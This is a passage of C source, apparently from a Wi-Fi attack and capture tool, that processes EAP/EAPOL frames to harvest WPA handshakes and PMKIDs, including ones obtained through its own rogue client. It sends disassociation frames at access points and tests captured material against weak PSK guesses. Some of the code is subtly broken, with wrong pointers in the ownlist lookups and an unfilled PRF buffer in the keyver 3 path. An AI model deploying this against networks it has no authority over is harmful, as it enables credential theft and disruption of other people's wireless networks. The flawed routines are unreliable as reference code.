			if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printown(zeiger, "EAP RESPONSE ID");
			}
		return;
		}
	memset(zeiger, 0, OWNLIST_SIZE);
	zeiger->timestamp = timestamp;
	zeiger->status = OW_EAP_RESP;
	memcpy(zeiger->ap, macfrx->addr1, 6);
	memcpy(zeiger->client, macfrx->addr2, 6);
	if(filtermode != 0)
		{
		if(setclientfilter(zeiger) == true)
			{
			qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
			return;
			}
		}
	if(fd_pcapng > 0)
		{
		if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
		}
	if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printown(zeiger, "EAP RESPONSE ID");
	qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
	return;
	}
if((macfrx->to_ds == 0) && (macfrx->from_ds == 1))
	{
	for(zeiger = ownlist; zeiger < ownlist +OWNLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		if((memcmp(zeiger->ap, macfrx->addr2, 6) != 0) && (memcmp(zeiger->client, macfrx->addr1, 6) != 0)) continue;
		zeiger->timestamp = timestamp;
		if((zeiger->status &FILTERED) == FILTERED) return;
		if((zeiger->status &OW_EAP_RESP) != OW_EAP_RESP)
			{
			zeiger->status |= OW_EAP_RESP;
			if(fd_pcapng > 0)
				{
				if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
				}
			if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
			}
		if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printown(zeiger, "EAP RESPONSE ID");
		return;
		}
	memset(zeiger, 0, OWNLIST_SIZE);
	zeiger->timestamp = timestamp;
	zeiger->status = OW_EAP_REQ;
	memcpy(zeiger->ap, macfrx->addr2, 6);
	memcpy(zeiger->client, macfrx->addr1, 6);
	if(filtermode != 0)
		{
		if(setclientfilter(zeiger) == true)
			{
			qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
			return;
			}
		}
	if(fd_pcapng > 0)
		{
		if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
		}
	if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
	if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printown(zeiger, "EAP RESPONSE ID");
	qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
	return;
	}
return;
}
/*===========================================================================*/
static inline void process80211exteap_req_id(uint16_t exteaplen)
{
static ownlist_t *zeiger;

if(exteaplen < EAPAUTH_SIZE) return;
if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
	{
	for(zeiger = ownlist; zeiger < ownlist +OWNLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		if((memcmp(zeiger->ap, macfrx->addr1, 6) != 0) && (memcmp(zeiger->client, macfrx->addr2, 6) != 0)) continue;
		zeiger->timestamp = timestamp;
		if((zeiger->status &FILTERED) == FILTERED) return;
		if((zeiger->status &OW_EAP_REQ) != OW_EAP_REQ)
			{
			zeiger->status |= OW_EAP_REQ;
			if(fd_pcapng > 0)
				{
				if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
				}
			if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printown(zeiger, "EAP REQUEST ID");
			}
		return;
		}
	memset(zeiger, 0, OWNLIST_SIZE);
	zeiger->timestamp = timestamp;
	zeiger->status = OW_EAP_REQ;
	memcpy(zeiger->ap, macfrx->addr1, 6);
	memcpy(zeiger->client, macfrx->addr2, 6);
	if(filtermode != 0)
		{
		if(setclientfilter(zeiger) == true)
			{
			qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
			return;
			}
		}
	if(fd_pcapng > 0)
		{
		if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
		}
	if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printown(zeiger, "EAP REQUEST ID");
	qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
	return;
	}
if((macfrx->to_ds == 0) && (macfrx->from_ds == 1))
	{
	for(zeiger = ownlist; zeiger < ownlist +OWNLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		if((memcmp(zeiger->ap, macfrx->addr2, 6) != 0) && (memcmp(zeiger->client, macfrx->addr1, 6) != 0)) continue;
		zeiger->timestamp = timestamp;
		if((zeiger->status &FILTERED) == FILTERED) return;
		if((zeiger->status &OW_EAP_REQ) != OW_EAP_REQ)
			{
			zeiger->status |= OW_EAP_REQ;
			if(fd_pcapng > 0)
				{
				if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
				}
			if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
			}
		if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printown(zeiger, "EAP REQUEST ID");
		return;
		}
	memset(zeiger, 0, OWNLIST_SIZE);
	zeiger->timestamp = timestamp;
	zeiger->status = OW_EAP_REQ;
	memcpy(zeiger->ap, macfrx->addr2, 6);
	memcpy(zeiger->client, macfrx->addr1, 6);
	if(filtermode != 0)
		{
		if(setclientfilter(zeiger) == true)
			{
			qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
			return;
			}
		}
	if(fd_pcapng > 0)
		{
		if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
		}
	if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
	if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printown(zeiger, "EAP REQUEST ID");
	qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
	return;
	}
return;
}
/*===========================================================================*/
static inline void process80211exteap(int authlen)
{
static uint8_t *eapauthptr;
static exteap_t *exteap;
static uint16_t exteaplen;

eapauthptr = payloadptr +LLC_SIZE +EAPAUTH_SIZE;
exteap = (exteap_t*)eapauthptr;
exteaplen = ntohs(exteap->len);
if(exteaplen > authlen) return;
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
if(exteap->type == EAP_TYPE_ID)
	{
	if(exteap->code == EAP_CODE_REQ) process80211exteap_req_id(exteaplen);
	else if(exteap->code == EAP_CODE_RESP) process80211exteap_resp_id(exteaplen);
	}
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline int omac1_aes_128_vector(const uint8_t *key, size_t num_elem, const uint8_t *addr[], const size_t *len, uint8_t *mac)
{
static CMAC_CTX *ctx;
static int ret = -1;
static size_t outlen, i;

ctx = CMAC_CTX_new();
if (ctx == NULL) return -1;
if (!CMAC_Init(ctx, key, 16, EVP_aes_128_cbc(), NULL)) goto fail;
for (i = 0; i < num_elem; i++)
	{
	if (!CMAC_Update(ctx, addr[i], len[i])) goto fail;
	}
if (!CMAC_Final(ctx, mac, &outlen) || outlen != 16) goto fail;
ret = 0;
fail:
CMAC_CTX_free(ctx);
return ret;
}
/*===========================================================================*/
static inline int omac1_aes_128(const uint8_t *key, const uint8_t *data, size_t data_len, uint8_t *mac)
{
return omac1_aes_128_vector(key, 1, &data, &data_len, mac);
}
/*===========================================================================*/
static inline bool detectweakwpa(uint8_t keyver, uint8_t essidlen, uint8_t *essid, uint8_t *anonce)
{
static int p;
static int authlen;
static uint8_t *pmk;
static uint8_t *eapauthptr;
static eapauth_t *eapauth;
static uint8_t *wpakptr;
static wpakey_t *wpak;
static uint8_t *pkeptr;
static uint8_t pkedata[102];
static uint8_t pkedata_prf[2 + 98 + 2];
static uint8_t ptk[128];
static uint8_t mymic[16];
static uint8_t keymic[16];

pmk = getpmk(essidlen, essid);
if(pmk == NULL) return false;
eapauthptr = payloadptr +LLC_SIZE;
eapauth = (eapauth_t*)eapauthptr;
authlen = ntohs(eapauth->len);
wpakptr = eapauthptr +EAPAUTH_SIZE;
wpak = (wpakey_t*)wpakptr;
memcpy(&keymic, wpak->keymic, 16);
memset(wpak->keymic, 0, 16);
if((keyver == 1 || keyver == 2))
	{
	pkeptr = pkedata;
	memset(&pkedata, 0, sizeof(pkedata));
	memset(&ptk, 0, sizeof(ptk));
	memcpy(pkeptr, "Pairwise key expansion", 23);
	if(memcmp(macfrx->addr1, macfrx->addr2, 6) < 0)
		{
		memcpy(pkeptr +23, macfrx->addr1, 6);
		memcpy(pkeptr +29, macfrx->addr2, 6);
		}
	else
		{
		memcpy(pkeptr +23, macfrx->addr2, 6);
		memcpy(pkeptr +29, macfrx->addr1, 6);
		}

	if(memcmp(anonce, wpak->nonce, 32) < 0)
		{
		memcpy (pkeptr +35, anonce, 32);
		memcpy (pkeptr +67, wpak->nonce, 32);
		}
	else
		{
		memcpy (pkeptr +35, wpak->nonce, 32);
		memcpy (pkeptr +67, anonce, 32);
		}
	for (p = 0; p < 4; p++)
		{
		pkedata[99] = p;
		HMAC(EVP_sha1(), pmk, 32, pkedata, 100, ptk + p *20, NULL);
		}
	if(keyver == 1) HMAC(EVP_md5(), &ptk, 16, eapauthptr, authlen +EAPAUTH_SIZE, mymic, NULL);
	if(keyver == 2) HMAC(EVP_sha1(), &ptk, 16, eapauthptr, authlen +EAPAUTH_SIZE, mymic, NULL);
	if(memcmp(&keymic, &mymic, 16) == 0) return true;
	return false;
	}
else if(keyver == 3)
	{
	pkeptr = pkedata;
	memset(&pkedata_prf, 0, sizeof(pkedata_prf));
	memset(&ptk, 0, sizeof(ptk));
	memcpy(pkeptr, "Pairwise key expansion", 22);
	if(memcmp(macfrx->addr1, macfrx->addr2, 6) < 0)
		{
		memcpy(pkeptr +22, macfrx->addr1, 6);
		memcpy(pkeptr +28, macfrx->addr2, 6);
		}
	else
		{
		memcpy(pkeptr +22, macfrx->addr2, 6);
		memcpy(pkeptr +28, macfrx->addr1, 6);
		}
	if(memcmp(anonce, wpak->nonce, 32) < 0)
		{
		memcpy (pkeptr +34, anonce, 32);
		memcpy (pkeptr +66, wpak->nonce, 32);
		}
	else
		{
		memcpy (pkeptr +34, wpak->nonce, 32);
		memcpy (pkeptr +66, anonce, 32);
		}
	HMAC(EVP_sha256(), pmk, 32, pkedata_prf, 2 + 98 + 2, ptk, NULL);
	omac1_aes_128(ptk, eapauthptr, authlen +EAPAUTH_SIZE, mymic);
	if(memcmp(&keymic, &mymic, 16) == 0) return true;
	return false;
	}
return false;
}
/*===========================================================================*/
static inline void printeapol(uint8_t *client, uint8_t *ap, char *msg, uint64_t timegap, uint64_t rc, uint8_t kdv, uint8_t *anonce)
{
static int c, p;
static macessidlist_t *zeiger;
static ownlist_t *zeigerown;
static bool pmkflag;
static char timestring[16];
static char essidstring[ESSID_LEN_MAX *2 +1];

pmkflag = false;
essidstring[0] = 0;
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(memcmp(zeiger->ap, ap, 6) == 0)
		{
		if((zeiger->essidlen != 0) && (zeiger->essid[0] != 0)) pmkflag = detectweakwpa(kdv, zeiger->essidlen, zeiger->essid, anonce); 
		p = 0;
		for(c = 0; c < zeiger->essidlen; c++)
			{
			if((zeiger->essid[c] < 0x20) || (zeiger->essid[c] > 0x7e)) essidstring[p++] = '.';
			else if(zeiger->essid[c] == 0x5c)
				{
				essidstring[p++] = 0x5c;
				essidstring[p++] = 0x5c;
				}
			else essidstring[p++] = zeiger->essid[c];
			}
		essidstring[p] = 0;
		break;
		}
	}
if(essidstring[0] == 0)
	{
	for(zeiger = rglist; zeiger < rglist +RGLIST_MAX; zeiger++)
		{
		if(memcmp(zeiger->ap, ap, 6) == 0)
			{
			if((zeiger->essidlen != 0) && (zeiger->essid[0] != 0)) pmkflag = detectweakwpa(kdv, zeiger->essidlen, zeiger->essid, anonce); 
			p = 0;
			for(c = 0; c < zeiger->essidlen; c++)
				{
				if((zeiger->essid[c] < 0x20) || (zeiger->essid[c] > 0x7e)) essidstring[p++] = '.';
				else if(zeiger->essid[c] == 0x5c)
					{
					essidstring[p++] = 0x5c;
					essidstring[p++] = 0x5c;
					}
				else essidstring[p++] = zeiger->essid[c];
				}
			essidstring[p] = 0;
			break;
			}
		}
	}
if(essidstring[0] == 0)
	{
	for(zeigerown = ownlist; zeigerown < ownlist +OWNLIST_MAX; zeigerown++)
		{
		if(memcmp(zeigerown->ap, ap, 6) == 0)
			{
			if((zeiger->essidlen != 0) && (zeiger->essid[0] != 0)) pmkflag = detectweakwpa(kdv, zeiger->essidlen, zeiger->essid, anonce); 
			p = 0;
			for(c = 0; c < zeigerown->essidlen; c++)
				{
				if((zeigerown->essid[c] < 0x20) || (zeigerown->essid[c] > 0x7e)) essidstring[p++] = '.';
				else if(zeigerown->essid[c] == 0x5c)
					{
					essidstring[p++] = 0x5c;
					essidstring[p++] = 0x5c;
					}
				else essidstring[p++] = zeigerown->essid[c];
				}
			essidstring[p] = 0;
			break;
			}
		}
	}
strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
if(essidstring[0] != 0)
	{
	if(pmkflag == false)
		{
		snprintf(servermsg, SERVERMSG_MAX, "%s %3d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [EAPOL:%s EAPOLTIME:%" PRIu64 " RC:%" PRIu64 " KDV:%d]\n", timestring, channelscanlist[cpa],
			client[0], client[1], client[2], client[3], client[4], client[5],
			ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],
			essidstring, msg, timegap, rc, kdv);
		}
	else
		{
		snprintf(servermsg, SERVERMSG_MAX, "%s %3d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [EAPOL:%s EAPOLTIME:%" PRIu64 " RC:%" PRIu64 " KDV:%d PSK:%s]\n", timestring, channelscanlist[cpa],
			client[0], client[1], client[2], client[3], client[4], client[5],
			ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],
			essidstring, msg, timegap, rc, kdv, weakcandidate);
		}
	}
else
	{
	snprintf(servermsg, SERVERMSG_MAX, "%s %3d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x [ESSID NOT RECEIVED YET] [EAPOL:%s EAPOLTIME:%" PRIu64 " RC:%" PRIu64 " KDV:%d]\n", timestring, channelscanlist[cpa],
		client[0], client[1], client[2], client[3], client[4], client[5],
		ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],
		msg, timegap, rc, kdv);
	}
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) sendto(fd_socket_mcsrv, servermsg, strlen(servermsg), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
else printf("%s", servermsg);
return;
}
/*===========================================================================*/
static inline void process80211eapol_m4(uint8_t keyinfo, uint8_t *wpakptr)
{
static wpakey_t *wpak;
static uint64_t rc;
static uint8_t keyver;

if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
memset(&lastauthap, 0, 6);
memset(&lastauthclient, 0, 6);
lastauthtimestamp = 0;
wpak = (wpakey_t*)wpakptr;
rc = be64toh(wpak->replaycount);
keyver = ntohs(wpak->keyinfo) & WPA_KEY_INFO_TYPE_MASK;
if((lastkeyinfo == 3) && (lastkeyver == keyver) && (lastrc == rc)
	&& ((timestamp -lasttimestamp) <= eapoltimeoutvalue)
	&& (memcmp(&lastap, macfrx->addr1, 6) == 0) 
	&& (memcmp(&lastclient, macfrx->addr2, 6) == 0))
		{
		if(memcmp(wpak->nonce, &zeroed32, 32) == 0)
			{
			if(addownap(AP_M3M4ZEROED, macfrx->addr1) == true)
				{
				eapolmp34zeroedcount++;
				if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printeapol(macfrx->addr2, macfrx->addr1, "M3M4ZEROED", timestamp -lasttimestamp, rc, keyver, lastanonce);
				}
			else
				{
				eapolmp34count++;
				if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printeapol(macfrx->addr2, macfrx->addr1, "M3M4", timestamp -lasttimestamp, rc, keyver, lastanonce);
				}
			}
		}
else
	{
	if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_AP_BUSY);
	}
lasttimestamp = timestamp;
memcpy(&lastap, macfrx->addr1, 6);
memcpy(&lastclient, macfrx->addr2, 6);
lastrc = rc;
lastkeyinfo = keyinfo;
lastkeyver = keyver;
return;
}
/*===========================================================================*/
static inline void process80211eapol_m3(uint8_t keyinfo, uint8_t *wpakptr)
{
static wpakey_t *wpak;
static uint64_t rc;
static uint8_t keyver;

if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
memset(&lastauthap, 0, 6);
memset(&lastauthclient, 0, 6);
lastauthtimestamp = 0;
wpak = (wpakey_t*)wpakptr;
rc = be64toh(wpak->replaycount);
if(rc == myrc) send_ack();
keyver = ntohs(wpak->keyinfo) & WPA_KEY_INFO_TYPE_MASK;
if((lastkeyinfo == 2) && (lastkeyver == keyver) && (lastrc == (rc -1))
	&& ((timestamp -lasttimestamp) <= eapoltimeoutvalue)
	&& (memcmp(&lastap, macfrx->addr2, 6) == 0) 
	&& (memcmp(&lastclient, macfrx->addr1, 6) == 0))
		{
		if((addown(OW_M2M3, macfrx->addr1, macfrx->addr2) == true) || (addownap(AP_M2M3, macfrx->addr2) == true))
			{
			eapolmp23count++;
			if((statusout &STATUS_EAPOL) == STATUS_EAPOL)
				{
				memcpy(&lastanonce, wpak->nonce, 32);
				printeapol(macfrx->addr1, macfrx->addr2, "M2M3", timestamp -lasttimestamp, rc, keyver, lastsnonce);
				}
			}
		}
lasttimestamp = timestamp;
memcpy(&lastap, macfrx->addr2, 6);
memcpy(&lastclient, macfrx->addr1, 6);
lastrc = rc;
lastkeyinfo = keyinfo;
lastkeyver = keyver;
return;
}
/*===========================================================================*/
static inline void process80211eapol_m2(uint8_t keyinfo, uint8_t *wpakptr)
{
static wpakey_t *wpak;
static uint64_t rc;
static uint8_t keyver;

if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
wpak = (wpakey_t*)wpakptr;
rc = be64toh(wpak->replaycount);
keyver = ntohs(wpak->keyinfo) & WPA_KEY_INFO_TYPE_MASK;
if(rc == myrc)
	{
	if((lastauthkeyver == keyver) && ((timestamp -lastauthtimestamp) <= eapoltimeoutvalue) && (memcmp(&lastauthap, macfrx->addr1, 6) == 0) && (memcmp(&lastauthclient, macfrx->addr2, 6) == 0))
		{
		if(addown(OW_M1M2ROGUE, macfrx->addr2, macfrx->addr1) == true)
			{
			eapolmp12roguecount++;
			if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printeapol(macfrx->addr2, macfrx->addr1, "M1M2ROGUE", timestamp -lastauthtimestamp, rc, keyver, myanonce);
			}
		lastauthtimestamp = 0;
		memset(&lastauthap, 0, 6);
		memset(&lastauthclient, 0, 6);
		lastauthkeyver = 0;
		return;
		}
	return;
	}
else if(lastrc == rc)
	{
	if((lastkeyinfo == 1) && (lastkeyver == keyver) && (lastrc == rc)
		&& ((timestamp -lasttimestamp) <= eapoltimeoutvalue)
		&& (memcmp(&lastap, macfrx->addr1, 6) == 0) 
		&& (memcmp(&lastclient, macfrx->addr2, 6) == 0))
		{
		if(addownap(AP_M1M2, macfrx->addr1) == true)
			{
			eapolmp12count++;
			if((statusout &STATUS_EAPOL) == STATUS_EAPOL)
				{
				memcpy(&lastsnonce, wpak->nonce, 32);
				printeapol(macfrx->addr2, macfrx->addr1, "M1M2", timestamp -lasttimestamp, rc, keyver, lastanonce);
				}
			}
		}
	}
lasttimestamp = timestamp;
memcpy(&lastap, macfrx->addr1, 6);
memcpy(&lastclient, macfrx->addr2, 6);
lastrc = rc;
lastkeyinfo = keyinfo;
lastkeyver = keyver;
return;
}
/*===========================================================================*/
static inline bool detectweakpmkid(uint8_t *macclient, uint8_t *macap, uint8_t *pmkid, uint8_t essidlen, uint8_t *essid)
{
static const char *pmkname = "PMK Name";
static uint8_t *pmk;
static uint8_t salt[32];
static uint8_t pmkidcalc[32];

pmk = getpmk(essidlen, essid);
if(pmk == NULL) return false;
memcpy(&salt, pmkname, 8);
memcpy(&salt[8], macap, 6);
memcpy(&salt[14], macclient, 6);
HMAC(EVP_sha1(), pmk, 32, salt, 20, pmkidcalc, NULL);
if(memcmp(&pmkidcalc, pmkid, 16) == 0) return true;
return false;
}
/*===========================================================================*/
static inline void printpmkid(uint8_t *client, uint8_t *ap, uint8_t *pmkid, uint8_t kdv, char *msg)
{
static int c, p;
static macessidlist_t *zeiger;
static ownlist_t *zeigerown;
static bool pmkflag;
static char timestring[16];
static char essidstring[ESSID_LEN_MAX *2 +1];

pmkflag = false;
essidstring[0] = 0;
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(memcmp(zeiger->ap, ap, 6) == 0)
		{
		if((zeiger->essidlen != 0) && (zeiger->essid[0] != 0))
		pmkflag = detectweakpmkid(client, ap, pmkid, zeiger->essidlen, zeiger->essid); 
		p = 0;
		for(c = 0; c < zeiger->essidlen; c++)
			{
			if((zeiger->essid[c] < 0x20) || (zeiger->essid[c] > 0x7e)) essidstring[p++] = '.';
			else if(zeiger->essid[c] == 0x5c)
				{
				essidstring[p++] = 0x5c;
				essidstring[p++] = 0x5c;
				}
			else essidstring[p++] = zeiger->essid[c];
			}
		essidstring[p] = 0;
		break;
		}
	}
if(essidstring[0] == 0)
	{
	for(zeigerown = ownlist; zeigerown < ownlist +OWNLIST_MAX; zeigerown++)
		{
		if(memcmp(zeigerown->ap, ap, 6) == 0)
			{
			pmkflag = detectweakpmkid(client, ap, pmkid, zeiger->essidlen, zeiger->essid); 
			p = 0;
			for(c = 0; c < zeigerown->essidlen; c++)
				{
				if((zeigerown->essid[c] < 0x20) || (zeigerown->essid[c] > 0x7e)) essidstring[p++] = '.';
				else if(zeigerown->essid[c] == 0x5c)
					{
					essidstring[p++] = 0x5c;
					essidstring[p++] = 0x5c;
					}
				else essidstring[p++] = zeigerown->essid[c];
				}
			essidstring[p] = 0;
			break;
			}
		}
	}

strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
if(essidstring[0] != 0)
	{
	if(pmkflag == false)
		{
		snprintf(servermsg, SERVERMSG_MAX, "%s %3d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [%s:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x KDV:%d]\n", timestring, channelscanlist[cpa],
			client[0], client[1], client[2], client[3], client[4], client[5],
			ap[0], ap[1], ap[2], ap[3], ap[4], ap[5], essidstring, msg,
			pmkid[0], pmkid[1], pmkid[2], pmkid[3], pmkid[4], pmkid[5], pmkid[6], pmkid[7],
			pmkid[8], pmkid[9], pmkid[10], pmkid[11], pmkid[12], pmkid[13], pmkid[14], pmkid[15],
			kdv);
		}
	else
		{
		snprintf(servermsg, SERVERMSG_MAX, "%s %3d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [%s:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x KDV:%d PSK:%s]\n", timestring, channelscanlist[cpa],
			client[0], client[1], client[2], client[3], client[4], client[5],
			ap[0], ap[1], ap[2], ap[3], ap[4], ap[5], essidstring, msg,
			pmkid[0], pmkid[1], pmkid[2], pmkid[3], pmkid[4], pmkid[5], pmkid[6], pmkid[7],
			pmkid[8], pmkid[9], pmkid[10], pmkid[11], pmkid[12], pmkid[13], pmkid[14], pmkid[15],
			kdv, weakcandidate);
		}
	}
else
	{
	snprintf(servermsg, SERVERMSG_MAX, "%s %3d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x [ESSID NOT RECEIVED YET] [%s:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x KDV:%d]\n", timestring, channelscanlist[cpa],
		client[0], client[1], client[2], client[3], client[4], client[5],
		ap[0], ap[1], ap[2], ap[3], ap[4], ap[5], msg,
		pmkid[0], pmkid[1], pmkid[2], pmkid[3], pmkid[4], pmkid[5], pmkid[6], pmkid[7],
		pmkid[8], pmkid[9], pmkid[10], pmkid[11], pmkid[12], pmkid[13], pmkid[14], pmkid[15],
		kdv);
	}
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) sendto(fd_socket_mcsrv, servermsg, strlen(servermsg), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
else printf("%s", servermsg);
return;
}
/*===========================================================================*/
static inline void process80211eapol_m1_own(uint16_t authlen, uint8_t keyinfo, uint8_t *wpakptr)
{
static wpakey_t *wpak;
static pmkid_t *pmkid;

send_ack();
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
wpak = (wpakey_t*)wpakptr;
lasttimestamp = timestamp;
memcpy(&lastclient, macfrx->addr1, 6);
memcpy(&lastap, macfrx->addr2, 6);
lastrc = be64toh(wpak->replaycount);
lastkeyinfo = keyinfo;
lastkeyver = ntohs(wpak->keyinfo) & WPA_KEY_INFO_TYPE_MASK;
if(addownap(AP_M1, macfrx->addr2) == false) return;
if(authlen >= WPAKEY_SIZE +PMKID_SIZE)
	{
	pmkid = (pmkid_t*)(wpakptr +WPAKEY_SIZE);
	if(memcmp(pmkid->pmkid, &zeroed32, 16) != 0)
		{
		if(addownap(AP_PMKID, macfrx->addr2) == false) return;
		pmkidroguecount++;
		if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printpmkid(macfrx->addr1, macfrx->addr2, pmkid->pmkid, lastkeyver, "PMKIDROGUE");
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211eapol_m1(uint16_t authlen, uint8_t keyinfo, uint8_t *wpakptr)
{
static wpakey_t *wpak;
static pmkid_t *pmkid;

if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
wpak = (wpakey_t*)wpakptr;
lasttimestamp = timestamp;
memcpy(&lastclient, macfrx->addr1, 6);
memcpy(&lastap, macfrx->addr2, 6);
lastrc = be64toh(wpak->replaycount);
lastkeyinfo = keyinfo;
lastkeyver = ntohs(wpak->keyinfo) & WPA_KEY_INFO_TYPE_MASK;
if((statusout &STATUS_EAPOL) == STATUS_EAPOL) memcpy(&lastanonce, wpak->nonce, 32);
if(authlen >= WPAKEY_SIZE +PMKID_SIZE)
	{
	pmkid = (pmkid_t*)(wpakptr +WPAKEY_SIZE);
	if(memcmp(pmkid->pmkid, &zeroed32, 16) != 0)
		{
		if(addownap(AP_PMKID, macfrx->addr2) == false) return;
		pmkidcount++;
		if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printpmkid(macfrx->addr1, macfrx->addr2, pmkid->pmkid, lastkeyver, "PMKID");
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211eapol(uint16_t authlen)
{
static uint8_t *wpakptr;
static wpakey_t *wpak;
static uint16_t keyinfo;

wpakptr = payloadptr +LLC_SIZE +EAPAUTH_SIZE;
wpak = (wpakey_t*)wpakptr;
keyinfo = (getkeyinfo(ntohs(wpak->keyinfo)));
if(keyinfo == 1)
	{
	if(memcmp(&mac_myclient, macfrx->addr1, 6) == 0) process80211eapol_m1_own(authlen, keyinfo, wpakptr);
	else process80211eapol_m1(authlen, keyinfo, wpakptr);
	return;
	}
if(keyinfo == 2) process80211eapol_m2(keyinfo, wpakptr);
else if(keyinfo == 3) process80211eapol_m3(keyinfo, wpakptr);
else if(keyinfo == 4) process80211eapol_m4(keyinfo, wpakptr);
return;
}
/*===========================================================================*/
static inline void process80211eap()
{
static uint8_t *eapauthptr;
static eapauth_t *eapauth;
static uint16_t eapauthlen;
static uint16_t authlen;

eapauthptr = payloadptr +LLC_SIZE;
eapauthlen = payloadlen -LLC_SIZE;
eapauth = (eapauth_t*)eapauthptr;
authlen = ntohs(eapauth->len);
if(authlen > (eapauthlen -4)) return;
if(eapauth->type == EAPOL_KEY)
	{
	if(authlen >= WPAKEY_SIZE) process80211eapol(authlen);
	}
else if(eapauth->type == EAP_PACKET) process80211exteap(authlen);
else if(eapauth->type == EAPOL_ASF) process80211exteap_asf();
else if(eapauth->type == EAPOL_MKA) process80211exteap_mka();
else if((eapauth->type == EAPOL_START) && (macfrx->to_ds == 1)) send_eap_request_id();
else if(eapauth->type == EAPOL_LOGOFF) return;
else
	{
	if(fd_pcapng > 0)
		{
		if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
		}
	}
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void process80211data_wep()
{
if(fd_pcapng > 0)
	{
